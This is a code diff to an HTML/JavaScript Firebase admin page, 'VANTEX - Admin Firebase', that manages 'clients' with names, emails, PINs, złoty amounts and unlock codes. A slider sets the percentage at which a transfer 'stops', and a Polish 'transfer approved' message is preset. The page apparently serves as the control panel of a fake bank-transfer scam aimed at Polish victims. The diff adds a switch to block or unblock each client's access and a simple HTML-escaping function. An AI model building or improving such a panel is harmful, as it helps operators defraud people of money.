@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>VANTEX - Admin Firebase</title>
 <style>
-:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280;--r:#dc2626}
+:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280;--r:#dc2626;--s:#10b981}
 *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
 body{margin:0;background:var(--bg);color:#111;font-size:14px}
 header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}
@@ -15,13 +15,20 @@ header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items
 .grid{display:grid;gap:10px;grid-template-columns:1fr 1fr}
 @media(max-width:700px){.grid{grid-template-columns:1fr}}
 label{font-size:12px;color:var(--m);display:block;margin-bottom:3px}
-input{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:14px}
+input,select{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:14px}
+.check-label{display:flex;align-items:center;gap:8px;margin-top:8px;color:#111}
+.check-label input{width:auto;margin:0}
 .btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600}
 .btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer}
 table{width:100%;border-collapse:collapse;font-size:13px}
 th,td{padding:9px;border-bottom:1px solid var(--b);text-align:left}
 th{background:#fafafa;color:var(--m);font-weight:600}
 .badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:11px}
+.badge-active{background:#e0f2fe;color:#0369a1}
+.badge-blocked{background:#fee2e2;color:#b91c1c}
+.toggle-btn{padding:4px 8px;font-size:11px;border-radius:4px;border:none;cursor:pointer;margin-left:4px}
+.btn-block{background:#fee2e2;color:#b91c1c}
+.btn-unblock{background:#dcfce7;color:#15803d}
 </style>
 </head>
 <body>
@@ -48,6 +55,10 @@ th{background:#fafafa;color:var(--m);font-weight:600}
       <label>Pourcentage d'arrêt du virement : <b id="pv">100</b>%</label>
       <input id="pct" type="range" min="1" max="100" value="100" style="width:100%">
     </div>
+    <div class="check-label">
+      <input type="checkbox" id="actif" checked>
+      <label style="margin:0">Accès autorisé (actif)</label>
+    </div>
     <div style="margin-top:12px;display:flex;gap:8px">
       <button class="btn" id="saveBtn">Enregistrer</button>
       <button class="btn2" id="resetBtn">Réinitialiser</button>
@@ -58,7 +69,9 @@ th{background:#fafafa;color:var(--m);font-weight:600}
     <h3 style="margin:0 0 10px">Clients enregistrés</h3>
     <div style="overflow:auto">
       <table>
-        <thead><tr><th>Client</th><th>PIN</th><th>Montant</th><th>Code</th><th>%</th><th>Action</th></tr></thead>
+        <thead>
+          <tr><th>Client</th><th>PIN</th><th>Montant</th><th>Code</th><th>%</th><th>Statut</th><th>Action</th></tr>
+        </thead>
         <tbody id="tb"></tbody>
       </table>
     </div>
@@ -100,6 +113,7 @@ onValue(clientsRef, snap => {
       code: 'ACT123',
       msg: 'Przelew zatwierdzony ✓',
       pct: 100,
+      actif: true,
       pays: '',
       adresse: '',
       tel: '',
@@ -110,19 +124,42 @@ onValue(clientsRef, snap => {
 });
 
 function render(){
-  const rows = Object.entries(data).map(([id,v]) => `
-    <tr>
-      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:11px">${v.email}</span></td>
-      <td><span class="badge">${v.pin}</span></td>
-      <td>${Number(v.montant).toLocaleString('pl-PL')} zł</td>
-      <td>${v.code}</td>
-      <td>${v.pct}%</td>
-      <td>
-        <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:11px">Modifier</button>
-        <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:11px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-left:4px">Supprimer</button>
-      </td>
-    </tr>`).join('');
-  $('tb').innerHTML = rows || '<tr><td colspan="6" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
+  const rows = Object.entries(data).map(([id,v]) => {
+    const actif = v.actif !== undefined ? v.actif : true;
+    const statusClass = actif ? 'badge-active' : 'badge-blocked';
+    const statusText = actif ? '✅ Actif' : '⛔ Bloqué';
+    const toggleText = actif ? 'Bloquer' : 'Débloquer';
+    const toggleClass = actif ? 'btn-block' : 'btn-unblock';
+    return `
+      <tr>
+        <td><b>${escapeHtml(v.nom)}</b><br><span style="color:#6b7280;font-size:11px">${escapeHtml(v.email)}</span></td>
+        <td><span class="badge">${escapeHtml(v.pin)}</span></td>
+        <td>${Number(v.montant).toLocaleString('pl-PL')} zł</td>
+        <td>${escapeHtml(v.code)}</td>
+        <td>${v.pct}%</td>
+        <td><span class="badge ${statusClass}">${statusText}</span></td>
+        <td>
+          <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:11px">Modifier</button>
+          <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:11px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-left:4px">Supprimer</button>
+          <button onclick="toggleAcces('${id}')" class="toggle-btn ${toggleClass}" style="margin-left:4px">${toggleText}</button>
+        </td>
+      </tr>
+    `;
+  }).join('');
+  $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
+}
+
+// simple protection XSS
+function escapeHtml(str) {
+  if (!str) return '';
+  return str.replace(/[&<>]/g, function(m) {
+    if (m === '&') return '&amp;';
+    if (m === '<') return '&lt;';
+    if (m === '>') return '&gt;';
+    return m;
+  }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+    return c;
+  });
 }
 
 $('saveBtn').onclick = () => {
@@ -134,6 +171,7 @@ $('saveBtn').onclick = () => {
     code: $('code').value.trim(),
     msg: $('msg').value.trim(),
     pct: Number($('pct').value),
+    actif: $('actif').checked,
     pays: $('pays').value.trim(),
     adresse: $('adresse').value.trim(),
     tel: $('tel').value.trim(),
@@ -149,7 +187,9 @@ $('resetBtn').onclick = resetForm;
 
 function resetForm(){
   ['nom','email','pin','montant','code','msg','pays','adresse','tel'].forEach(i=>$(i).value='');
-  $('pct').value=100; $('pv').textContent='100'; editId=null;
+  $('pct').value=100; $('pv').textContent='100';
+  $('actif').checked = true;
+  editId=null;
 }
 
 window.editClient = (id) => {
@@ -158,6 +198,7 @@ window.editClient = (id) => {
   $('montant').value=v.montant; $('code').value=v.code; $('msg').value=v.msg;
   $('pct').value=v.pct; $('pv').textContent=v.pct;
   $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
+  $('actif').checked = (v.actif !== undefined ? v.actif : true);
   window.scrollTo({top:0,behavior:'smooth'});
 };
 
@@ -165,6 +206,17 @@ window.delClient = (id) => {
   if(confirm('Supprimer ce client? Il ne pourra plus se connecter.')){
     remove(ref(db, 'clients/'+id));
   }
+};
+
+window.toggleAcces = (id) => {
+  const client = data[id];
+  if(!client) return;
+  const newStatus = !(client.actif !== undefined ? client.actif : true);
+  update(ref(db, 'clients/'+id), { actif: newStatus, updated: Date.now() })
+    .then(() => {
+      console.log(`Accès ${newStatus ? 'débloqué' : 'bloqué'} pour ${client.nom}`);
+    })
+    .catch(err => alert("Erreur mise à jour: "+err));
 };
 </script>
 </body>
